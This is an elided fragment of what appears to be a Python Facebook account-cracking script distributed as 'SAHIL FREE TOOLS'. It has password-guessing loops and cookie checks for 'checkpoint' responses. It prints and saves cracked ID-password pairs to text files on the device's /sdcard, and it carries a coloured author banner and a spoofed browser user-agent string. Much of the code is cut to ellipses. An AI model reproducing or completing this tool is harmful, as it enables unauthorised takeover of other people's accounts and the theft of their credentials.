	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				open('/sdcard/SAHIL-CP.txt','a').write('%s\n' % wrt)
	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r\x1b[1;92m [SUCCESSFUL-SAHIL] {idf} * {pw}')

				wrt =('%s - %s' % (idf,pw))

				ok.append(wrt)

				open('/sdcard/SUCCESSFUL-SAHIL.txt','a').write('%s\n' % wrt)
...
\33[1;32m𝔽𝕒𝕔𝕖𝕓𝕠𝕠𝕜 : SAHIL KHAN

\33[1;32m𝔾𝕚𝕥𝕙𝕦𝕓   : Devilherekingkhan

\33[1;32m𝕍𝕖𝕣𝕤𝕚𝕠𝕟  : 0.0.7

\033[1;92m══════════════════════════════════════════════════

\33[1;41m\33[1;37m▓░▒░▒▓░▒░▒▓░▒▓░▒▓█[ ✔︎ SAHIL FREE TOOLS ✔︎ ]█▓▒░▓░▒░▒▓░▒▓░▒▓\33[0m
...
"Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12
